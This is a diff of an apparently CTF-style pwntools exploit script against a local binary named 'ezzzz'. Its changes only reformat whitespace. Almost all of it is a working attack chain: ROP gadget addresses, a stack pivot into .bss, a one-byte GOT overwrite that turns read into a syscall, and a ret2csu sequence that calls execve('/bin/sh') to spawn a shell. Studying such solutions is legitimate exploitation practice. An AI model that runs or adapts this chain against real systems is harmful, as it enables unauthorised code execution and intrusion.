@@ -4,45 +4,45 @@ context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])
 io = process("./ezzzz")
 elf = ELF("./ezzzz")
 
-pop_rdi = 0x4007e3
-pop_rsp_rrr = 0x4007dd
-pop_rsi_r15 = 0x4007e1
-read_got = elf.got[b"read"]
-read_text = 0x400752
-main_addr = 0x400740
+pop_rdi=0x4007e3
+pop_rsp_rrr=0x4007dd
+pop_rsi_r15=0x4007e1
+read_got=elf.got[b"read"]
+read_text=0x400752
+main_addr=0x400740
 write_to_bss=0x400606
 bss_addr=0x601800
 
 #csu:
-gadget1 = 0x4007DA
-gadget2 = 0x4007C0
+gadget1=0x4007DA
+gadget2=0x4007C0
 
 # gdb.attach(io)
 # pause()
 
-payload = cyclic(0x10)+p64(bss_addr+0x10)+p64(read_text)
+payload=cyclic(0x10)+p64(bss_addr+0x10)+p64(read_text)
 io.send(payload)
 
 
-payload = cyclic(0x8)+p64(read_text)+p64(bss_addr)+p64(pop_rdi)+p64(read_got)+p64(write_to_bss)+p64(read_text) #read_got->bss
+payload=cyclic(0x8)+p64(read_text)+p64(bss_addr)+p64(pop_rdi)+p64(read_got)+p64(write_to_bss)+p64(read_text) #read_got->bss
 io.send(payload)
 
 
-payload = b'/bin/sh\x00'+cyclic(0x8)+p64(bss_addr+0x600)+p64(read_text)+cyclic(0x10)+b"\x90" #low byte->'\x90'->syscall
+payload=b"/bin/sh\x00"+cyclic(0x8)+p64(bss_addr+0x600)+p64(read_text)+cyclic(0x10)+b"\x90" #low byte->'\x90'->syscall
 io.send(payload)
 
 # gdb.attach(io)
 # pause()
 
-payload = cyclic(0x10)+p64(bss_addr+0x400)+p64(read_text)+p64(gadget1)+p64(0)+p64(1)+p64(0x601820)+p64(0)+p64(0)+p64(0x6017f0)+p64(gadget2) #r12->syscall r15->edi->str_bin_sh
+payload=cyclic(0x10)+p64(bss_addr+0x400)+p64(read_text)+p64(gadget1)+p64(0)+p64(1)+p64(0x601820)+p64(0)+p64(0)+p64(0x6017f0)+p64(gadget2) #r12->syscall r15->edi->str_bin_sh
 io.send(payload)
 
 
-payload = cyclic(0x10)+p64(bss_addr+0x400)+p64(elf.sym[b"read"])
+payload=cyclic(0x10)+p64(bss_addr+0x400)+p64(elf.sym[b"read"])
 io.send(payload)
 
 
-payload = p64(gadget1)+cyclic(0x18)+p64(pop_rsp_rrr)+p64(bss_addr+0x600-0x8)+p64(0)+cyclic(0x3) #rax=0x3b -> execve
+payload=p64(gadget1)+cyclic(0x18)+p64(pop_rsp_rrr)+p64(bss_addr+0x600-0x8)+p64(0)+cyclic(0x3) #rax=0x3b -> execve
 io.send(payload)
 
 # gdb.attach(io)
